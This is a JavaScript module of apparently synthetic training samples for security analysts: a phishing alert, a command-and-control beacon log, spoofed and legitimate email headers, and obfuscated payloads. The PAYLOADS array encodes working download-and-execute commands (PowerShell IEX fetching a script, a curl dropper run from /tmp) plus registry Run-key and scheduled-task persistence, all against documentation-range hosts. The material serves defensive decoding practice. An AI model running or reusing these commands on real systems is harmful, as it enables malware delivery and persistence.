// Training samples. All IPs are RFC 5737 documentation ranges or RFC 1918 private space,
// the hashes belong to the harmless EICAR test file, and the brand "Northwind" is fictional.
import { encode } from "./decode.js";

export const PHISHING_INCIDENT = `[SOC ALERT #48213] User-reported phishing: "Action required: payroll update"
Reporter: j.doe@northwind.example (Finance)   Host: FIN-WS-0142 (10.20.4.17)

Sender:      payroll-notice[@]northwind-hr-portal[.]com
Reply-To:    hr.verify@secure-payroll-check[.]top
Link in body: hxxps://northwind-hr-portal[.]com/login/update.php?uid=4821
Redirects to: hxxp://198.51.100.77/kit/o365/index.html

Attachment: Payroll_Update_Nov.pdf.exe
  MD5:     44d88612fea8a8f36de82e1278abb02f
  SHA-1:   3395856ce81f2b7382dee72602f798b642f14140
  SHA-256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f

Proxy shows FIN-WS-0142 (10.20.4.17) resolved qx7v2kfj9plm3tzr8w.top two minutes after the click.`;

export const C2_BEACON_LOG = `2026-11-17T14:02:11Z fw01 ALLOW TCP 10.20.4.17:51544 -> 203.0.113.45:443 bytes=512  app=ssl sni=cdn-telemetry-sync.net
2026-11-17T14:03:11Z fw01 ALLOW TCP 10.20.4.17:51551 -> 203.0.113.45:443 bytes=508  app=ssl sni=cdn-telemetry-sync.net
2026-11-17T14:04:12Z fw01 ALLOW TCP 10.20.4.17:51560 -> 203.0.113.45:443 bytes=511  app=ssl sni=cdn-telemetry-sync.net
2026-11-17T14:04:40Z dns01 QUERY A a9f3kz7qw2xv8mt4lp6rbn.xyz from 10.20.4.17 -> NXDOMAIN
2026-11-17T14:04:41Z dns01 QUERY A m2c8vx4q9tzk7wj3rfp6.xyz from 10.20.4.17 -> 198.51.100.23
2026-11-17T14:05:12Z fw01 ALLOW TCP 10.20.4.17:51577 -> 203.0.113.45:443 bytes=4096 app=ssl sni=cdn-telemetry-sync.net
2026-11-17T14:05:30Z proxy01 GET http://198.51.100.23/updates/svc.bin UA="Microsoft-CryptoAPI/10.0" status=200
2026-11-17T14:05:31Z edr01 FILE_WRITE C:\\ProgramData\\svc.bin sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
2026-11-17T14:06:12Z fw01 ALLOW TCP 10.20.4.17:51590 -> 203.0.113.45:443 bytes=509  app=ssl sni=cdn-telemetry-sync.net
2026-11-17T14:06:15Z fw01 DENY  TCP 10.20.4.17:51602 -> 192.168.10.5:445 rule=block-lateral-smb`;

/* ---------- Mode 2 payloads (built at load time so every layer is genuinely encoded) ---------- */
const STAGE_PS =
  "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage2.ps1'); " +
  "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\upd.exe /f; " +
  "whoami";
const PS_LAUNCHER = `powershell.exe -nop -w hidden -enc ${encode.base64Utf16le(STAGE_PS)}`;

export const PAYLOADS = [
  {
    label: "Layered PowerShell",
    hint: "Base64 → Hex → PowerShell -enc (UTF-16LE)",
    value: encode.base64Utf8(encode.hex(PS_LAUNCHER)),
  },
  {
    label: "URL-encoded dropper",
    hint: "Percent-encoding → Base64 shell one-liner",
    value: encode.url(
      `bash -c "echo ${encode.base64Utf8(
        "curl -s http://198.51.100.23/x.sh -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x; uname -a"
      )} | base64 -d | sh"`
    ),
  },
  {
    label: "Char-code JScript",
    hint: "String.fromCharCode → WScript.Shell",
    value: `eval(String.fromCharCode(${encode.charCodes(
      'var s=new ActiveXObject("WScript.Shell");s.Run("cmd.exe /c schtasks /create /tn Upd /tr C:\\\\ProgramData\\\\svc.exe /sc onlogon",0);'
    )}))`,
  },
];

export const SPOOFED_EMAIL = `Delivered-To: j.doe@northwind.example
Received: by 2002:a05:6838:9c1e:b0:7a1:1f2e:3c4d with SMTP id m30csp112233;
        Mon, 17 Nov 2026 14:02:19 -0800 (PST)
Received: from mx-relay2.northwind.example (mx-relay2.northwind.example [192.0.2.25])
        by mx.northwind.example with ESMTPS id 4f8a2c1;
        Mon, 17 Nov 2026 14:02:17 -0800 (PST)
Received: from mail.bulk-sender-xq7.ru (unknown [203.0.113.88])
        by mx-relay2.northwind.example with ESMTP id 9b3e7d2;
        Mon, 17 Nov 2026 14:01:49 -0800 (PST)
Received: from [10.0.0.14] (helo=desktop-7h2k)
        by mail.bulk-sender-xq7.ru with esmtpa (Exim 4.96);
        Mon, 17 Nov 2026 21:58:03 +0000
Authentication-Results: mx.northwind.example;
       spf=fail (mx.northwind.example: domain of bounce@bulk-sender-xq7.ru does not designate 203.0.113.88 as permitted sender) smtp.mailfrom=bounce@bulk-sender-xq7.ru;
       dkim=none (message not signed) header.d=none;
       dmarc=fail (p=REJECT sp=REJECT dis=QUARANTINE) header.from=northwind.example
Return-Path: <bounce@bulk-sender-xq7.ru>
From: "Northwind IT Service Desk <servicedesk@northwind.example>" <servicedesk@northwind-helpdesk.top>
Reply-To: password-reset@secure-verify-mailbox.top
To: j.doe@northwind.example
Subject: [Action Required] Your mailbox password expires today
Date: Mon, 17 Nov 2026 21:57:58 +0000
Message-ID: <a81c9f2e.4d1b@desktop-7h2k>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
X-Mailer: PHPMailer 6.8.0`;

export const LEGIT_EMAIL = `Received: from mail-sor-f41.google.com (mail-sor-f41.google.com [198.51.100.41])
        by mx.northwind.example with ESMTPS id 1a2b3c;
        Mon, 17 Nov 2026 09:15:04 -0500 (EST)
Received: by mail-sor-f41.google.com with SMTP id 5e6f7a;
        Mon, 17 Nov 2026 06:15:02 -0800 (PST)
Authentication-Results: mx.northwind.example;
       spf=pass (domain of alerts@vendor.example designates 198.51.100.41 as permitted sender) smtp.mailfrom=alerts@vendor.example;
       dkim=pass header.i=@vendor.example header.s=sel1;
       dmarc=pass (p=QUARANTINE) header.from=vendor.example
Return-Path: <alerts@vendor.example>
From: Vendor Alerts <alerts@vendor.example>
To: soc@northwind.example
Subject: Monthly invoice available
Date: Mon, 17 Nov 2026 06:15:01 -0800`;
